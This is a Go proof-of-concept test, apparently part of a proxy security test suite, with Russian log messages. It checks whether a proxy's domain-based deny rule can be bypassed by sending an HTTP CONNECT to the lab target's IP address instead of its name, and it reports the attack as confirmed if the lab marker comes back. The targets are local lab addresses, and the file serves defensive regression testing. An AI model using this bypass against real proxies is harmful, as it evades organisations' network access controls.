package main

import (
	"io"
	"log"
	"strings"
	"time"

	"oktopus/attack-and-tests/poclib"
)

func cmdRun(args []string) int {
	log.SetFlags(0)
	o, err := parseFlags(args)
	if err != nil {
		return 2
	}
	ok, err := runAttack(o)
	if err != nil {
		log.Printf("run: %v", err)
		return 1
	}
	return boolToExit(ok)
}

func runAttack(o poclib.RunOpts) (bool, error) {
	log.Println("=== control: CONNECT secret.lab (dstdomain deny) ===")
	if hit := probeCONNECT(o, "secret.lab:9777", true); hit {
		log.Println("control: уязвимость — secret.lab доступен")
		return true, nil
	}

	log.Println("=== bypass: CONNECT 127.0.0.1:9777 (имя secret.lab запрещено только по dstdomain) ===")
	if hit := probeCONNECT(o, labAddr, false); hit {
		log.Println("bypass: ПОДТВЕРЖДЕНО — TCP до lab по IP")
		return true, nil
	}
	log.Println("bypass: отказ (ожидаемо при deny dst)")
	return false, nil
}

func probeCONNECT(o poclib.RunOpts, dest string, expectDeny bool) bool {
	conn, br, code, err := poclib.DialCONNECT(o.ProxyAddr, dest, o.ProxyUser, o.ProxyPass)
	if err != nil {
		log.Printf("CONNECT %s: %v (HTTP %d)", dest, err, code)
		return false
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))
	_, _ = io.WriteString(conn, "PROBE\r\n")
	buf := make([]byte, 512)
	n, _ := br.Read(buf)
	payload := string(buf[:n])
	if strings.Contains(payload, labMarker) {
		return !expectDeny
	}
	return false
}

func boolToExit(attackOK bool) int {
	if attackOK {
		return 1
	}
	return 0
}
